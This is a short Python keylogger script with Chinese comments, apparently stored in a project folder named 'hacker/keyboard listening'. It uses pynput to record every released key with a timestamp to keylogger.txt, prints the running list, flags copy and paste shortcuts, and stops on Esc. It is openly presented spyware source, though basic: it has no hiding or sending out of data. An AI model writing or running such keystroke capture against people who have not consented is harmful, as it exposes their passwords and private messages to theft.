# coding=utf-8
import threading
import time
from pynput.keyboard import Controller, Key, Listener
import logging

from 黑客.监听键盘.监听键盘1 import start_listen

# 运行日志的基本配置 格式=字符串形式的当前时间:用户输出的消息 级别=日志记录调试
logging.basicConfig(filename='./keylogger.txt', format='%(asctime)s:%(message)s', level=logging.DEBUG)


# 每隔秒清空列表
def doWaiting():
    while True:
        time.sleep(5)
        all_key.clear()


# 键盘松开
def on_release(key):
    all_key.append(str(key))
    # 保存到日志
    logging.info(all_key)
    print(all_key)
    if 'key.ctrl_l' in all_key and 'c' in all_key:
        print('复制快捷键')
    if 'key.ctrl_l' in all_key and 'v' in all_key:
        print('粘贴快捷键')

    if key == Key.esc:
        # 停止监听
        return False


def start_listen():
    # on_press=press,
    with Listener(on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    all_key = []
    t = threading.Thread(target=doWaiting)
    t.setDaemon(True)  # 守护进程
    t.start()
    start_listen()
